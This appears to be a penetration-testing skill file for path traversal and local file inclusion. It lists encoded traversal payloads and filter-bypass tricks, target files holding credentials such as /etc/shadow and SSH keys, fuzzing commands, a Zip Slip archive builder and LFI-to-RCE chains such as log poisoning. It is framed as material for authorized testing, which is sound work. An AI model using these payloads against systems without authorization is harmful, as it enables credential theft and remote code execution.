---
name: path_traversal
description: Path traversal / directory traversal / LFI testing
applicable_contexts: [web, api, file_operations]
---

## Path Traversal Testing

### Basic Payloads

```
../../../etc/passwd
..\..\..\..\windows\system32\drivers\etc\hosts
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
..%c0%af..%c0%afetc/passwd
```

### Target Files (Linux)

```
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/var/log/apache2/access.log
/home/user/.ssh/id_rsa
/home/user/.bash_history
```

### Target Files (Windows)

```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Windows\System32\config\SAM
C:\inetpub\wwwroot\web.config
C:\Users\Administrator\.ssh\id_rsa
```

### Filter Bypass Techniques

| Bypass | Payload |
|--------|---------|
| Null byte (legacy) | `../../../etc/passwd%00.png` |
| Double encoding | `%252e%252e%252f` |
| Unicode encoding | `..%c0%af`, `..%ef%bc%8f` |
| Stripped dots | `....//....//` (if `../` is removed once) |
| Mixed slashes | `..\../..\/etc/passwd` |
| Path normalization | `/var/www/../../etc/passwd` |

### Automated Discovery

```bash
# ffuf — path traversal fuzzing
ffuf -u "TARGET_URL?file=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -mc 200 -fs 0 -o /workspace/lfi-ffuf.json

# dotdotpwn
dotdotpwn -m http -h TARGET_HOST -o /workspace/dotdotpwn.txt

# nuclei
nuclei -u TARGET_URL -t ~/nuclei-templates/vulnerabilities/generic/lfi*.yaml
```

### Zip Slip Attack

Malicious archive with path traversal in filenames:
```python
import zipfile
with zipfile.ZipFile('malicious.zip', 'w') as z:
    z.writestr('../../../../../../tmp/evil.txt', 'pwned')
```

### LFI to RCE Chains

- Log poisoning: inject PHP code in User-Agent → include access.log
- PHP wrappers: `php://filter/convert.base64-encode/resource=config.php`
- `/proc/self/fd/N`: include open file descriptors
- Session file inclusion: inject code in PHP session file
- Environment variables: `php://input` with POST body

### Validation Requirements

- Demonstrate reading a file outside intended directory
- Show file content (first few lines, mask sensitive data)
- Document exact parameter and payload used
- Test multiple traversal depths (may need 5-10 levels)
- Confirm: is it read-only or can files be written/overwritten?

### Business Impact

- Source code disclosure (credentials, API keys in config)
- Credential theft (/etc/shadow, SSH keys, .env files)
- RCE escalation via log poisoning or file write
- Infrastructure mapping via /proc, /etc/hosts
